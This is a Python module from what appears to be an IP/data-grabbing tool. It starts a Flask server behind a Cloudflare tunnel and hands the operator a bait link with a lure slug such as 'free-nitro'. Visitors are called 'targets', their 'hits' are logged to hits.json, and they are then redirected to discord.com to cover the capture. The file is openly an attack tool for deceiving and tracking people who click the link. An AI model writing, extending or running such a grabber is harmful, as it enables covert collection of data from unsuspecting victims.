import threading
import time
from core.grabber import get_flask_app
from core.tunnel import start_cloudflare_tunnel
from core.display import section, divider, clear, banner
from colorama import Fore, Style

PORT = 5555


def run():
    clear()
    banner()
    section("LINK GENERATOR")

    print(Fore.WHITE + "\n  Enter a slug for your tracking link.")
    print(Fore.WHITE + "  Example: free-nitro")
    print(Fore.WHITE + "  Result:  https://xxxx.trycloudflare.com/free-nitro\n")
    path_slug = input(Fore.WHITE + "  → Slug (Enter for none): ").strip().strip("/")

    print(Fore.WHITE + "\n  Where should the target be redirected after the hit?")
    print(Fore.WHITE + "  Default: https://discord.com")
    redirect = input(Fore.WHITE + "  → Redirect URL (Enter for default): ").strip()
    if not redirect:
        redirect = "https://discord.com"

    # patch redirect into grabber dynamically
    import core.grabber as grabber_mod
    _patch_redirect(grabber_mod, redirect)

    app = get_flask_app()
    t = threading.Thread(
        target=lambda: app.run(
            host="0.0.0.0", port=PORT, debug=False, use_reloader=False
        ),
        daemon=True,
    )
    t.start()
    time.sleep(1)

    public_url = start_cloudflare_tunnel(PORT)
    if public_url == "tunnel_failed":
        print(Fore.RED + "\n  [!] Tunnel failed. Run setup.bat again.")
        input("\n  Press Enter to return...")
        return

    send_link = f"{public_url}/{path_slug}" if path_slug else public_url

    clear()
    banner()
    section("LINK GENERATOR — LIVE")
    print(Fore.WHITE + "\n  Your link  →  " + Fore.RED + Style.BRIGHT + send_link)
    print(Fore.WHITE + "  Redirect   →  " + redirect)
    print(Fore.WHITE + "  Hits log   →  hits.json\n")
    divider()
    print(Fore.WHITE + "  Waiting for hits... (Ctrl+C to stop)\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n  [*] Stopped. Hits saved to hits.json\n")
        input(Fore.WHITE + "  Press Enter to return...")


def _patch_redirect(grabber_mod, redirect_url: str):
    """Dynamically swap the redirect URL in the Flask route."""
    import flask
    app = grabber_mod.flask_app
    # rebuild the route with new redirect
    with app.test_request_context():
        pass  # warmup
    grabber_mod._REDIRECT = redirect_url
